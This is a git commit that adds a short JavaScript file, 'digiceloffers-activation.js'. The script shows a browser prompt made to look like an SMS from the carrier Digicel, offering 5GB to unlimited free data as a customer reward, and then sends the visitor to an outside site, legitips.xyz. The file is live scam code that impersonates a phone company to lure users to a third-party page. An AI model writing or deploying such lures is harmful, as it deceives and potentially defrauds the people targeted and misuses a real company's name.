c93836bc0f02886740c71e68678aaad289abd899
legitips <83867893+legitips@users.noreply.github.com>
2024-06-18 08:58:05 -0700

    Create digiceloffers-activation.js

---
+++ digiceloffers-activation.js
@@ -0,0 +1,6 @@
+var password = '1'
+password=prompt('DIGICEL SMS: Dear customer, kindly check if your DIGICEL sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/digiceloffers.html';
+}
+
